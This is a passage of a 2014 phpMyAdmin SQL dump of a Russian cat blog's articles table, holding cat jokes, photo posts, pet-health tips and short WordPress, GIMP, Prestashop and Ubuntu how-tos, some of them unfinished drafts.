-- phpMyAdmin SQL Dump
-- version 4.0.10deb1
-- http://www.phpmyadmin.net
--
-- Хост: localhost
-- Время создания: Июн 15 2014 г., 21:57
-- Версия сервера: 5.5.37-0ubuntu0.14.04.1
-- Версия PHP: 5.5.9-1ubuntu4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данных: `test_kotoblog`
--

-- --------------------------------------------------------

--
-- Структура таблицы `articles`
--

CREATE TABLE IF NOT EXISTS `articles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `text` longtext COLLATE utf8_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `publish` tinyint(1) NOT NULL,
  `weight` int(11) DEFAULT NULL,
  `created_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `slug_index` (`slug`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=90 ;

--
-- Дамп данных таблицы `articles`
--

INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(1, 'Эти смешные коты :)', 'eti-smieshnyie-koty', '<p>Это первая статья блога посвящена смешным котам. Все любят котов - кто-то любит их гладить, кто-то играть - а мы решили что здорово будет над котами немного поржать. Так вот мы предлагаем Вам заняться этим нехитрым делом в продолжении этой статьи. Здесь собраны фото со всего интернета (не все конечно же :) которые надолго подымут настроение и станут отличным началом хорошего, позитивного дня. Желаем Вам приятного просмотра :))) <!--more--> <img alt="Смешной кот" class="img-responsive" src="/uploads/2010/12/00038s90.jpg" style="width: 450px; height: 341px;" title="Смешной кот" /></p>\r\n\r\n<p><img alt="Кот в прыжке" class="img-responsive" src="/uploads/2010/12/2510945.jpg" style="width: 400px; height: 344px;" title="Кот в прыжке" /></p>\r\n\r\n<p><img alt="1242077743_foto-koty-igry-00" class="img-responsive" src="/uploads/2010/12/1242077743_foto-koty-igry-00.jpg" style="width: 450px; height: 301px;" title="1242077743_foto-koty-igry-00" /></p>\r\n\r\n<p><img alt="Кот вегетарианец " class="img-responsive" src="/uploads/2010/12/wallpapers_cats_587.jpg" style="width: 450px; height: 338px;" title="Кот вегетарианец " /></p>', '/uploads/2014/02/eti-smieshnyie-koty.jpeg', 1, NULL, '2010-12-30 13:06:24'),
(2, 'Кошка против принтера', 'koshka-protiv-printiera', '<p>Культовое видео! А главное очень актуальное :)</p>\r\n\r\n<div class="embeddedContent"><iframe allowfullscreen="true" allowscriptaccess="always" frameborder="0" height="349" scrolling="no" src="//www.youtube.com/embed/J_DCtp3XJ0Q?wmode=transparent&amp;jqoemcache=xra8x" width="425"></iframe></div>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2010-12-30 13:35:57'),
(3, 'Анекдоты', 'aniekdoty', '<p>Самые смешные, самые лучшие, самые невероятные анекдоты о котах :) <!--more--></p>\r\n\r\n<p>На заграничном пляже. Муж&nbsp;&mdash; жене:<br />\r\n&mdash; Маша, ты Барсику корм оставила?<br />\r\n&mdash; Я думала, что ты оставил.<br />\r\n&mdash; Ну вот&nbsp;&mdash; что ни отпуск, то кота хороним.</p>\r\n\r\n<p>Беседуют двое мужиков.<br />\r\nОдин говорит:<br />\r\n&mdash; Хочу кота купить&nbsp;&mdash; жена не дает.<br />\r\nВторой:<br />\r\n&mdash; А почему ты решил, что тебе кот даст?</p>\r\n\r\n<p>&mdash; Кот вчера спрятался в чемодане и отказывается выходить.<br />\r\n&mdash; Требует загранпаспорт и вертолёт?<br />\r\n&mdash; Ага, и яйца чтобы обратно пришили...</p>\r\n\r\n<p>Гость видит у хозяев кота и спрашивает:<br />\r\n&mdash; Как зовут?<br />\r\n&mdash; Кастрюлька.<br />\r\n&mdash; Потому что в кастрюли залазит, как у Куклачёва?<br />\r\n&mdash; Нет, потому что кастрированный.</p>\r\n\r\n<p>Встречаются две подруги...<br />\r\n&mdash; Как дела?<br />\r\n&mdash; Развелась... Живу на лекарствах... Валерьянка пять раз в день...<br />\r\n&mdash; Бедная, никто тебя не любит, не понимает... .<br />\r\n&mdash; Ну почему же? Кот... любит!</p>\r\n\r\n<p>Пассажир стюардессе:<br />\r\n&mdash; А чего это летчики через левое плечо плюются?<br />\r\n&mdash; Черная кошка через дорогу перелетела!<br />\r\n&mdash; А откуда она здесь взялась?<br />\r\n&mdash; Космонавты со станции выкинули!</p>\r\n\r\n<p>Мы давно знаем, что когда коты обссыкают кусты и углы&nbsp;&mdash; то этим они метят свою территорию. Но недавно ученые выяснили, зачем коты обссыкают колеса автомобилей&nbsp;&mdash; это они, гады, друг дружке СМС-ки шлют.</p>\r\n\r\n<p>&mdash; А я реально думаю что между животным и хозяином есть связь незримая... Вот однажды у меня кошка лапку поранила, так у меня просто так почему-то нога заболела...<br />\r\n&mdash; БЛИН!!! У МЕНЯ ЗАВТРА КОТА КАСТРИРУЮТ!</p>', NULL, 1, NULL, '2010-12-30 13:45:39'),
(4, 'Смешные фото', 'smieshnyie-foto', '<p>Очередная подборка смешных фотографий котов <!--more--><img alt="кот на отдыхе"  class="img-responsive" src="/uploads/2010/12/0_229a3_80c81386_xl.jpg" style="width: 640px; height: 480px;" title="кот на отдыхе" /></p>\r\n\r\n<p><img alt="Приветствие кота" class="img-responsive" src="/uploads/2010/12/8e186b6adc8f.jpg" style="width: 477px; height: 600px;" title="Приветствие кота" /></p>\r\n\r\n<p><img alt="котиха-модель"  class="img-responsive" src="/uploads/2010/12/4436_7328.jpg" style="width: 304px; height: 432px;" title="котиха-модель" /></p>\r\n\r\n<p><img alt="Кот заснул на мониторе" class="img-responsive" src="/uploads/2010/12/cat_sleeping_on_computer_screen.jpg" style="width: 324px; height: 407px;" title="Кот заснул на мониторе" /></p>\r\n\r\n<p><img alt="Кот вступил в лужу" class="img-responsive" src="/uploads/2010/12/cats_01.jpg" style="width: 500px; height: 516px;" title="Кот вступил в лужу" /></p>\r\n\r\n<p><img alt="Кот и собака" class="img-responsive" src="/uploads/2010/12/cats_alert_23.jpg" style="width: 622px; height: 450px;" title="Кот и собака" /></p>\r\n\r\n<p><img alt="Мама-кот обучает котика охоте" class="img-responsive" src="/uploads/2010/12/fotoprikol_027.jpg" style="width: 600px; height: 414px;" title="Мама-кот обучает котика охоте" /></p>', '/uploads/2014/02/smieshnyie-foto.jpeg', 1, NULL, '2010-12-30 14:04:36'),
(5, 'Здоровье кота - самое главное!', 'zdorov-ie-kota-samoie-ghlavnoie', 'Здоровье наших любимых котов и кошечек в большей степени зависит от нас самих. А если летом любимец побывал в селе или на даче, то в квартире, в замкнутом пространстве его недомагание может проявиться в раздражительности, что вовсе не способствует здоровому отношению между нами.\n\n<!--more-->\n\nОчень много, если не сказать все зависит от ухода за питомцем. Так регулярное питание, чистота туалета и места содержания способствует укреплению кошачего здоровья. Не следует также злоупотреблять лаской - слишком изнеженный кот будет скорей всего много есть что несомненно плохо для кота.\n\nНу так как же все таки определить что кот или кошка нездорова? Если человек чувствует себя плохо он обязательно это выразит словами, плюс сходит к врачу. А коты? Коты также жалуются, только мы не всегда можем распознать эту жалобу и поздно обращаемся к ветеринару.\n\nЛечить наших четвероногих друзей нелегко но возможно. Мы как хозяева животных должны знать как оказать нашим любимцам доврачебную помощь, а когда и вообще изолировать животное от себе подобных или даже от людей.\n\nЗдоровая кошка подвижна, весела или спокойна. Акты дефектации и мочеиспускания регулярны, имеет хороший аппетит, ровное дыхание, влажный и прохладный нос.\n<p align="justify">Больные кошки становятся вялыми, раздражительными, не отзываются на кличку, забиваются в укромные уголки, предпочитают лежать. Мочка носа становится сухой, нередко горячей, глаза слезятся, аппетит понижается или отсутствует, тускнеет шерстный покров, могут появиться кашель, одышка, понос или запор, рвота, повышенная жажда. В зависимости от характера заболевания отмечаются значительные колебания перечисленных выше симптомов.</p>\n<p align="justify">Давно замечено, что кошки сами зализывают свои раны. И это не случайно, так как в их слюне имеется особое вещество - лизоцим, под действием которого рана очищается от вредных микробов и быстрее заживает. При расстройствах пищеварения, ранах в ротовой полости и при других болезнях во время прогулок кошки отыскивают и поедают известные только им растения. Не препятствуйте этому - способность к самолечению у кошек закреплена генетически. Все лекарства, как и другие химические вещества, храните в недоступном для домашних питомцев месте.</p>\n<p align="justify">Специалисты определяют состояние здоровья животного по их общему виду, а кроме того, путем осмотра ушей, глаз, шерстного покрова и т. д. Для уточнения диагноза важную роль играют лабораторные исследования (гельминтологические, бактериологические и др.).</p>\n<p align="justify">При обследовании и оказанииветеринарной помощи необходимо прежде всего произвести правильную фиксацию животного - так называют закрепление тела животного или отдельных его частей в определенном положении,- что обеспечит безопасность как кошки, так и человека. Кошку обычно удерживает владелец. Применять различные способы фиксации следует так, чтобы не было нежелательных последствий (травм и т. д.).v</p>\n<p align="justify">Известны следующие способы применения лекарств:</p>\n\n<ul>\n	<li>внутрь - через рот дают различные порошки, микстуры, таблетки, болюсы, капсулы, пилюли, растворы и масляные эмульсии;</li>\n	<li>внутримышечно вводят кошкам растворы антибиотиков, новокаина, сульфат магния;</li>\n	<li>подкожно вводят антибиотики и все растворы, предназначенные для инъекций, а также вакцины и сыворотки;</li>\n	<li>внутривенное введение лекарственных веществ кошкам представляет значительные трудности, поэтому этот метод применяют в крайних случаях;</li>\n	<li>ингаляции и физико-терапевтические методы лечения;</li>\n	<li>наружным способом применяют различные мази, компрессы, растворы и др.</li>\n</ul>\n<p align="justify">Некоторые лекарства больным животным могут давать сами хозяева. Для этого кошку необходимо зафиксировать, а затем пинцетом, деревянной лопаткой или рукой положить на корень языка нужное лекарство.</p>\n<p align="justify">Согревающие компрессы делают так; салфетку, смоченную лекарственным веществом, накладывают на больное место, поверх кладут пергаментную бумагу и компрессную вату, а затем забинтовывают.</p>', NULL, 1, NULL, '2010-12-30 14:21:28'),
(6, 'Коты в искусстве', 'koty-v-iskusstvie', '<p>Хотел поделиться с читателями искусством. Представляю на ваше обозрение подборку котов в искусстве. <!--more--><img alt="Длинный кот" class="img-responsive" src="/uploads/2010/12/3131201.jpg" style="width: 750px; height: 455px;" title="Длинный кот" /></p>\r\n\r\n<p><img alt="Поющие коты" class="img-responsive" src="/uploads/2010/12/1113029i.jpg" style="width: 396px; height: 400px;" title="Поющие коты" /></p>\r\n\r\n<p><img alt="Кот пАд забором" class="img-responsive" src="/uploads/2010/12/38096680_1231846053_trio.jpg" style="width: 640px; height: 528px;" title="Кот пАд забором" /></p>\r\n\r\n<p><img alt="кот-гольфмэн" class="img-responsive" src="/uploads/2010/12/48748018_5.jpg" style="width: 640px; height: 442px;" title="кот-гольфмэн" /></p>\r\n\r\n<p><img alt="Коты за столом" class="img-responsive" src="/uploads/2010/12/49677780_6c07f3e59eea.jpg" style="width: 699px; height: 460px;" title="Коты за столом" /></p>\r\n\r\n<p><img alt="Вежливый кот" class="img-responsive" src="/uploads/2010/12/62613780.jpg" style="width: 443px; height: 578px;" title="Вежливый кот" /></p>\r\n\r\n<p><img alt="Кот и кальян" class="img-responsive" src="/uploads/2010/12/b20190-374x400.jpg" style="width: 374px; height: 400px;" title="Кот и кальян" /></p>\r\n\r\n<p><img alt="Кот играет на гитаре" class="img-responsive" src="/uploads/2010/12/y9zag3gilb1yjlev.jpg" style="width: 640px; height: 455px;" title="Кот играет на гитаре" /></p>', '/uploads/2014/02/koty-v-iskusstvie.jpeg', 1, NULL, '2010-12-31 00:24:32'),
(7, 'Новогодние коты', 'novoghodniie-koty', '<p>А здесь мы узнаем какие они - Деды морозы в кошачем государстве! :) <!--more--><img alt="" class="img-responsive" src="/uploads/2010/12/1961.jpg" style="width: 498px; height: 452px;" /></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2010/12/37150393_kotuyvobnimku.jpg" style="width: 500px; height: 470px;" /></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2010/12/67673952_1291959869_vinsent_happy_new_year.jpg" style="width: 684px; height: 699px;" /></p>\r\n\r\n<p><img alt="Кот дед мороз" class="img-responsive" src="/uploads/2010/12/2003630262.jpg" style="width: 500px; height: 479px;" title="Кот дед мороз" /></p>', '/uploads/2014/02/novoghodniie-koty.jpeg', 1, NULL, '2010-12-31 00:30:48'),
(8, 'Антивирусный кот в Новый Год', 'antivirusnyi-kot-v-novyi-god', '<p>Нашел замечательную рекламу 2010 года. Уверен прийделься по вкусу читателям моего блога.</p>\r\n\r\n<div class="embeddedContent"><iframe allowfullscreen="true" allowscriptaccess="always" frameborder="0" height="349" scrolling="no" src="//www.youtube.com/embed/5InW89_vnHQ?wmode=transparent&amp;jqoemcache=tugdd" width="425"></iframe></div>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2011-01-01 06:41:39'),
(9, 'Облако тегов culumus', 'oblako-tieghov-culumus', '<p>Нашел на WordpressPlugins последнюю версию плагина <strong>Culumus</strong>. Плагин работает на Flash и является альтернативой скучному встроенному расширению. В отличие от стандартного <strong>culumus</strong> действительно является <strong>облаком тегов</strong>, т.к. объемный вращающийся шар воспринимается как тучка :) В принципе <a href="http://www.wordpressplugins.ru/look/wp-cumulus.html" target="_blank" title="Открыть статью в новом окне">в статье</a> уже достаточно много написано о настройках этого расширения, и даже много больше. Здесь же я опишу <strong>основные этапы установки и настройки</strong>. <!--more-->Установка предельно проста, как и любого другого расширения для <strong>WordPress</strong>. <a href="http://www.wordpressplugins.ru/download/wp-cumulus.zip">Качаем архив</a> с русской версией (1.23) расширения Распаковуем на жестком диске Закачиваем на свой сайт в папку /wp-content/plugins/</p>\r\n\r\n<ol>\r\n</ol>\r\n\r\n<p>После этого, плагин появиться во вкладке &quot;Плагины&quot; административной части сайта, где его нужно активировать.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/settings-cumulus.jpg" style="width: 196px; height: 542px;" /></p>\r\n\r\n<p><strong>Несколько слов о настройках плагина.</strong> Настроить можем через вкладку &quot;Настройки&quot; из админки. Там вконце должна была появиться ссылка, или непосредственно через меню &quot;Виджеты&quot; при вставке расширения на сайт. <strong> Заголовок </strong>выбираем таким чтобы он был человекопонятным, ибо он будет выводиться на сайте <strong>Ширина, высота</strong>. Необходимо указать в соответствии с размерами сайдбара, ну и подогнать визуально конечно же, дабы теги не выходили за грани&nbsp;дозволенного&nbsp;:) <strong>Цвет тегов</strong> подгоняем под шаблон <strong>Цвет градиента</strong> позволяет дополнительно оформить цвета тегов <strong>Цвет подсветки</strong>. При наведении мышкой на тег - цвет меняется на указанный <strong>Цвет фона</strong>. Можно установить &quot;Прозрачный фон&quot; с помощью галки ниже, но он не рекомендуется по причине зависания тучки. Поэтому лучше использовать цвет фона сайдбара. <strong>Скорость вращения</strong> регулируем от 1 до 100 <strong>Расположить равномерно по сфере</strong> - ничего не меняем Можно отображать теги, рубрики или все вместе в облаке <strong>Параметры.</strong> Оставляем это поле пустым или смотрим <a href="http://codex.wordpress.org/Function_Reference/wp_tag_cloud" target="_blank">сюда</a>. Если ничего не понимаем оставляем пустым. :) Но если кому нетерпится, спрашивайте в комментариях будем по-ходу&nbsp;разбираться. На этом все. Облако должно отобразиться на сайте в той части где вы его разместили.</p>', '/uploads/2014/02/oblako-tieghov-culumus.png', 1, NULL, '2011-01-02 08:41:03'),
(10, 'Межнациональное общение', 'miezhnatsional-noie-obshchieniie', '<div class="embeddedContent"><iframe allowfullscreen="true" allowscriptaccess="always" frameborder="0" height="349" scrolling="no" src="//www.youtube.com/embed/c4Z7GCj1fhQ?wmode=transparent&amp;jqoemcache=tmMRt" width="425"></iframe></div>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2011-01-02 12:30:32'),
(11, 'Кот и муха', 'kot-i-mukha', '<div class="embeddedContent"><iframe allowfullscreen="true" allowscriptaccess="always" frameborder="0" height="349" scrolling="no" src="//www.youtube.com/embed/yo775I0j6QA?wmode=transparent&amp;jqoemcache=T9yul" width="425"></iframe></div>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2011-01-02 12:52:43'),
(12, 'Песня посвящается котам', 'piesnia-posviashchaietsia-kotam', '<p>Эта песня, малоизвестной днепропетровской группы &quot;Прощай Декаданс&quot; очень хорошо вписывается в нашу тематику. Не могу не сдержаться &nbsp;и не вылажить ее здесь. Надеюсь всем тем кто ее будет слушать она здорово поднимет настроение. :) [audio:ByeDekodans-Cats.mp3]</p>', NULL, 0, NULL, '2011-01-04 00:34:20'),
(13, 'Полезные команды bash', 'polieznyie-komandy-bash', '<table border="1px solid black">\n<tbody>\n<tr>\n<td>gnome-screenshot --interactive</td>\n<td>Скрин экрана с удобными настройками. Самый простой способ сделать скрин контекстного меню</td>\n</tr>\n<tr>\n<td>apt-get install vsftpd</td>\n<td>Установка FTP сервера</td>\n</tr>\n<tr>\n<td>halt</td>\n<td>Выключение компьютера</td>\n</tr>\n<tr>\n<td>dpkg -s &lt;имя_пакета&gt;</td>\n<td>Выводит информацию об установленном пакете</td>\n</tr>\n<tr>\n<td>crontab -l</td>\n<td>есть ли у <user> файл crontab для cron</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>', NULL, 0, NULL, '2011-04-15 04:18:17'),
(14, 'Подготовка дизайна сайта при помощи Gimp', 'podghotovka-dizaina-saita-pri-pomoshchi-gimp', 'Обычно когда затея сайта окончательно созрела и руки чешутся с чего-нибудь начать, правилней всего будет начать с письменного плана действий, структуры сайта и его дизайна. О подготовке последнего мы сегодня и поговорим...\n\n<!--more-->Для подготовки дизайна нам понадобится<a href="http://www.gimp.org/downloads/" target="_blank"> Gimp</a> (консерваторы могут воспользоватся FotoShop - ом). Качаем, устанавливаем, запускаем.\n\n<img class="alignleft size-full wp-image-198" style="margin: 5px;" title="panel-gimp1" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/panel-gimp1.jpg" alt="panel-gimp1" width="171" height="185" />Далее жмем Ctrl+N или Файл-&gt;Создать... выбираем шаблон А4 жмем Ок. Дальше интересней. Если мы не хотим оставить белый фон, а например хотим градиентную заливку фона выбираем инструмент <img class="alignnone size-full wp-image-206" style="margin: 2px;" title="gimp-gradient" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/gimp-gradient.jpg" alt="gimp-gradient" width="22" height="23" /> "Градиентная заливка"\n\nВнизу мы можем выбрать два цвета градиента основной и фоновый. Если кликнуть на какой либо из них можно определить цвет в том числе и с помощью <img class="alignnone size-full wp-image-207" style="margin: 2px;" title="gimp-pipetka" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/gimp-pipetka.jpg" alt="gimp-pipetka" width="28" height="27" /> пипетки\n\n<img class="size-full wp-image-197 alignnone" style="margin: 5px;" title="panel-gimp2" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/panel-gimp2.jpg" alt="panel-gimp2" width="550" />\n\nВыбираем основной в прозрачный (в моем примере мне пришлось создать Основной-Фоновый-Прозрачный) и тянем мышкой сверху вниз, вот так:\n\n<img class="alignnone size-full wp-image-200" title="panel-gimp3" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/panel-gimp31.jpg" alt="panel-gimp3" width="550" height="376" />\nДолжно получится что то типа такого:\n<img class="alignnone size-full wp-image-202" title="panel-gimp41" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/panel-gimp41.jpg" alt="panel-gimp41" width="550" height="551" />\nДальше отобразим слайдер с главным меню.\nСоздаем новый слой (Слой-&gt;Создать слой...), выбираем его в диалоге слоев, берем <img class="alignnone size-full wp-image-208" style="margin: 2px;" title="gimp-prjamougolnoe-videlenie" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/gimp-prjamougolnoe-videlenie.jpg" alt="gimp-prjamougolnoe-videlenie" width="21" height="19" /> прямоугольное выделение на панели инструментов и рисуем слайдер, далее идем в Выделение-&gt;Закруглить прямоугольник радиус выставляем 20 и закрашиваем в черный цвет <img class="alignnone size-full wp-image-209" style="margin: 2px;" title="gimp-zalivka" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/gimp-zalivka.jpg" alt="gimp-zalivka" width="25" height="26" /> заливкой.\n<img class="alignnone size-full wp-image-203" title="panel-gimp5" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/panel-gimp5.jpg" alt="panel-gimp5" width="367" height="571" />\nБерем инструмент <img class="alignnone size-full wp-image-205" style="margin: 2px;" title="gimp-move1" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/gimp-move1.jpg" alt="gimp-move1" width="23" height="23" /> перемещение и "тащим" наш черный прямоугольник немного вверх, а освободившееся под ним место <img class="alignnone size-full wp-image-209" title="gimp-zalivka" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/gimp-zalivka.jpg" alt="gimp-zalivka" width="25" height="26" /> закрашиваем цветом главного меню:\n<img class="alignnone size-full wp-image-210" title="panel-gimp6" src="http://kotoblog.pp.ua/wp-content/uploads/2011/07/panel-gimp6.jpg" alt="panel-gimp6" width="531" height="665" />', NULL, 0, NULL, '2011-07-06 03:05:12'),
(15, 'Импорт товаров Prestashop', 'import-tovarov-prestashop', 'Первое что нам понадобится это снимок базы данных, ее текущего состояния. Назовем его DB1.\n\nИдем в панель управления и создаем произвольный товар, нужной нам категории.\n\nСнимаем повторно базу данных. Называем DB2\n\nОткрываем KDiff3 (если еще не установлен - <a title="KDiff3 - Home" href="http://kdiff3.sourceforge.net/">качаем, устанавливаем</a>)\n\nСравниваем два файла:\n\n&nbsp;', NULL, 0, NULL, '2012-05-08 16:34:06'),
(16, 'Простое оформление заказа Prestashop', 'prostoie-oformlieniie-zakaza-prestashop', '\n<ol>\n	<li>Качаем ThickBox с сайта производителя, помещаем в папку с js скриптами нашей темы.</li>\n	<li>Прописуем js и css в header.tpl нашей темы</li>\n\n<pre lang="html">\n<script type="text/javascript" src="{$js_dir}thickbox.js"></script>\n<link href="{$base_dir}css/thickbox.css" rel="stylesheet" type="text/css" media="all" />\n</pre>\nСам thickbox.css должен быть установлен в системе по-умолчанию.\n\n	<li>В скачанном js файле меняем переменную tb_pathToImage на свою (путь к картинке busy.gif)</li>\n	<li>фываф</li>\n	<li>ыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n	<li>фыва</li>\n</ol>', NULL, 0, NULL, '2012-05-11 00:50:42'),
(17, 'Статистика сервера на Ubuntu при помощи serverstats', 'statistika-sierviera-na-ubuntu-pri-pomoshchi-serverstats', '', NULL, 0, NULL, '2012-07-05 06:44:56'),
(18, 'Статистика сервера Ubuntu при помощи Serverstats', 'statistika-sierviera-ubuntu-pri-pomoshchi-serverstats', '<img class="alignleft size-medium wp-image-302" title="57243154" src="http://kotoblog.pp.ua/wp-content/uploads/2012/07/57243154-220x300.jpg" alt="" width="220" height="300" />\n\nУже достаточно давно использую статистику нагрузки на сервер на рабочей станции. Но вот пришло время установить помощника - старенький селерон в обязаности которого входило постоянный скан и парсинг сети Интернет. И снова теже грабли. Так вот. Чтобы установить статистику на свой сервер под Ubuntu нужно прописать всего две команды в терминале:\n\n&nbsp;', NULL, 0, NULL, '2012-07-05 06:50:07'),
(19, 'Установка Git из исходников на Ubuntu 12.04', 'ustanovka-git-iz-iskhodnikov-na-ubuntu-12-04', 'Я знаю что этого полно в сети, но этой информации не место в моей учебной тетради :) Посему предлагаю свою проверенную версию установки. Итак, открываем терминал:\n<pre lang="bash">sudo apt-get install libcurl4-gnutls-dev libexpat1-dev gettext\nsudo apt-get install libz-dev libssl-dev</pre>\nКачаем последнюю версию Git отсюда - http://git-scm.com/download или здесь - https://github.com/git/git/downloads', NULL, 0, NULL, '2012-10-20 10:29:15'),
(20, '', '', '<a href="http://kotoblog.pp.ua/wp-content/uploads/2013/03/5171840-vacuum-cleaner-with-clipping-path.jpg"><img class="alignleft size-thumbnail wp-image-345" title="5171840-vacuum-cleaner-with-clipping-path" src="http://kotoblog.pp.ua/wp-content/uploads/2013/03/5171840-vacuum-cleaner-with-clipping-path-150x150.jpg" alt="" width="150" height="150" /></a>В одном из скриптов нашел интерессную реализацию удаление файлов срок хранения которых подошел к концу. И дабы не искать его где либо в следующий раз выкладываю здесь.\n<pre lang="php">\n /**\n     * Deletes all file parts in the chunks folder for files uploaded\n     * more than chunksExpireIn seconds ago\n     */\n    protected function cleanupChunks($folder, $expireIn)\n    {\n        foreach (scandir($folder) as $item) {\n            if ($item == "." || $item == "..")\n                continue;\n\n            $path = $folder . DIRECTORY_SEPARATOR . $item;\n\n            if (!is_dir($path))\n                continue;\n\n            if (time() - filemtime($path) > $expireIn) {\n                $this->removeDir($path);\n            }\n        }\n    }\n\n    /**\n     * Removes a directory and all files contained inside\n     * @param string $dir\n     */\n    protected function removeDir($dir)\n    {\n        foreach (scandir($dir) as $item) {\n            if ($item == "." || $item == "..")\n                continue;\n\n            unlink($dir . DIRECTORY_SEPARATOR . $item);\n        }\n        rmdir($dir);\n    }\n</pre>', NULL, 0, NULL, '2013-03-08 16:53:32'),
(21, 'Audio Player для WordPress 2.0b6', 'audio-player-dlia-wordpress-2-0b6', '<p>Нашел отличный плагин для WordPress. Он позволяет не только воспроизводить mp3 файлы на Вашем сайте, но и организовывать подкасты - для этого у него есть некоторые настройки помогающие упростить работу... но об этом чуть позже. Для примера: [audio:Mary J. Blige - Sorry Seems To Be The Hardest Word.mp3] Ну а если вы послушали песню, немного всплакнули :), и все еще хотите добавить эту замечательную возможность на свой блог WordPress, предлагаю Вам заняться этим немедленно :). <!--more--></p>\r\n\r\n<ol>\r\n	<li>Качаем <a href="/uploads/2011/01/audio-player.zip">плагин&nbsp;Audio Player v.2.0b6</a></li>\r\n	<li>Распаковуем архив на компьютере</li>\r\n	<li>Закачиваем папку с плагином в&nbsp;wp-content/plugins</li>\r\n	<li>В админке сайта переходим на вкладку &quot;Плагины&quot;, активируем плагин</li>\r\n	<li>В корне сайта создаем папку audio в которой будем хранить наши mp3 файлы</li>\r\n</ol>\r\n\r\n<p>Теперь можем прямо в текст статьи вставлять тег</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/teg.jpg" style="width: 248px; height: 32px;" /></p>\r\n\r\n<p>или</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/teg2.jpg" style="width: 471px; height: 30px;" /></p>\r\n\r\n<p>Это еще не все. Мы можем настроить внешний вид и функциональность под наши запросы. Перейдем на вкладку Настройки -&gt; Audio Player во вкладку General</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/general.jpg" style="width: 300px; height: 315px;" /></p>\r\n\r\n<p>Replace [audio] syntax. Эта настройка позволяет заменять тег [audio] на плеер. По умолчанию включен, и отключать его не стоит... разве что у Вас другие планы на этот счет :) Replace all links to mp3 files. Заменяет все ссылки аудио файлов на плеер. Если Вы хотите чтобы ваши посетители не только слушали но и могли скачать музыку с Вашего сайта - не отмечайте этот элемент. Enclosure inegration. Добавляет Имя произвольного поля в редакторе статей, при этом в поле Значение следует указать полный путь к аудио файлу, напр. audio/myfile.mp3. По наблюдениям работает некоректно с русскими названиями аудио записей. Move enclosures to the beginning of posts. Отображает аудио плеер вначале статьи. Default audio folder location. Если Вы создали паку audio в корне блога то при нажатии Verify должно появиться радостное сообщение системы :) Также здесь можно указать любой другой, произвольный путь к папке с аудио. Вкладка Display Здесь мы можем подогнать наш плеер под шаблон сайта. Player width - указываем длинну плеера при проигрывании медиа файла Colour sheme - указываем цвета отдельных элементов. Рекомендую использовать основные цвета шаблона. Ну и конечно же reset colour scheme - сброс настроек на начальные. Feed option.&nbsp;Настройки для RSS Podcasting. Здесь мы можем указать ссылку на аудиофайл который будет вставляться вначале и/или&nbsp;в конце&nbsp;всех звукозаписей опубликованных на блоге. Абсолютно необходимо для ведения подкаста. Advanced. Расширенные настройки Используйте&nbsp;Audio Player для WordPress, и пусть Ваш блог наполняется материалами и будет интересен Вашим посетителям.</p>', NULL, 1, NULL, '2011-01-04 01:50:01'),
(22, 'Автоматический редирект', 'avtomatichieskii-riediriekt', '<p>На днях понадобилось создать <strong>автоматический редирект.</strong> Суть в том что малобюджетные, или некомерческие проэкты по ошибке регистрируются (награждаются :)) платными доменными именами. И когда приходит время платить за имя... Ближе к теме. <strong>Автоматический редирект</strong> - это перенаправление на заданную страницу с заданным временным интервалом. <!--more--> Сразу скажу что пользоваться нужно им осторожно, т.к. поисковые машины относятся к <strong>редиректу</strong> не очень дружелюбно. Некоторые оптимизаторы используют этот метод для привлечения новых посетителей по специально отточенным ключевым запросам используемых на странице с <strong>редиректом</strong>. Для этого нам понадобиться:</p>\r\n\r\n<ul>\r\n	<li>Сервер с возможностью выполнения PHP скриптов</li>\r\n	<li>Текстовый редактор (лучше всего подойдет <a href="http://notepad-plus-plus.org/" target="_blank" title="Официальный сайт 